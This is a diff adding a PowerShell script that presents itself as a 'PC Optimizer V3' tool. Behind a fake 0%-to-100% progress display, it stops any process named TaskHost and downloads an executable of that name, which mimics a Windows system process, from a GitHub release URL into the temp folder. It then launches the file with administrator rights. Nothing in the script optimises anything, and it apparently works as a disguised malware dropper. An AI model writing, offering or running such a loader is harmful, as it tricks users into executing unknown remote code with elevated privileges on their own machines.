@@ -1,0 +1,59 @@
+Clear-Host
+
+# --- Configuration ---
+$procName = "TaskHost"
+$tempDir = [System.IO.Path]::GetTempPath()
+$out = Join-Path $tempDir "TaskHost.exe"
+
+# Replace with a stable direct URL to your file
+$directUrl = "https://github.com/nickjonoob-hub/kenoxreg/releases/download/KENOX/TaskHost.exe"
+
+# --- UI ---
+Write-Host ""
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host "         PC OPTIMIZER V3" -ForegroundColor Green
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "0%" -ForegroundColor Yellow
+
+# --- Ensure TEMP folder exists ---
+if (!(Test-Path $tempDir)) {
+    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+}
+
+# --- Stop old process ---
+Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force
+
+# --- Delete old file ---
+if (Test-Path $out) {
+    Remove-Item $out -Force -ErrorAction SilentlyContinue
+}
+
+# --- Download fresh copy ---
+try {
+    Write-Host "Downloading..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $directUrl -OutFile $out -ErrorAction Stop
+
+    # Verify download
+    if (!(Test-Path $out)) {
+        throw "Downloaded file not found."
+    }
+
+    Clear-Host
+    Write-Host ""
+    Write-Host "======================================" -ForegroundColor Cyan
+    Write-Host "         PC OPTIMIZER V3" -ForegroundColor Green
+    Write-Host "======================================" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "100%" -ForegroundColor Green
+    Write-Host ""
+    Read-Host "Press ENTER to run"
+
+    # Run as Administrator
+    Start-Process -FilePath $out -Verb RunAs
+}
+catch {
+    Write-Host ""
+    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Read-Host "Press ENTER to exit"
+}
